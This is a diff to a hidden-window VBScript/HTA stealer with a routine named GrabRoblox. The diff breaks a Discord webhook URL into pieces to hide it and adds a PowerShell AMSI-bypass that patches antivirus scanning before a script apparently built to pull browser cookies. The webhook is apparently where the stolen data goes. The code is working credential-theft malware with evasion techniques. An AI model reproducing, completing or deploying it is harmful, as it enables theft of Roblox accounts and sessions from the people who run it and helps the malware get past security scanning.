@@ -7,7 +7,12 @@ On Error Resume Next
 Dim sh, fso, WH
 Set sh  = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-WH = "https://discord.com/api/webhooks/1557940328634392599/JB0LWj2uMiMYkGJoikIs-rRBHtcZWwHy125EHn3ecDLdrOBrb724VFvH1jpQTYzhuAzL"
+
+Dim w1, w2, w3
+w1 = "https://discord.com/api/webhooks/"
+w2 = "1557951458891010148/"
+w3 = "Bb3aABhoBoEHQl37C4vw_jnlXRGrzic6ME3-sOnUeHnbkxzTh6MIwNpiNnIWnklI8jvd"
+WH = w1 & w2 & w3
 
 Sub Window_OnLoad()
     window.resizeTo 0,0
@@ -39,7 +44,14 @@ Sub GrabRoblox()
     tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\rr.txt"
     If fso.FileExists(tf) Then fso.DeleteFile tf, True
 
-    Dim ps : ps = _
+    Dim amsi : amsi = _
+        "$a=[Ref].Assembly.GetTypes()|%{if($_.Name-like'*iUtils'){$_}};" & vbLf & _
+        "$b=$a.GetFields('NonPublic,Static')|%{if($_.Name-like'*Context'){$_}};" & vbLf & _
+        "$c=$b.GetValue($null);[IntPtr]$ptr=$c;" & vbLf & _
+        "[Int32[]]$buf=@(0);" & vbLf & _
+        "[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);" & vbLf
+
+    Dim ps : ps = amsi & _
         "Add-Type -AssemblyName System.Security" & vbLf & _
         "$cookie = $null" & vbLf & _
         "" & vbLf & _
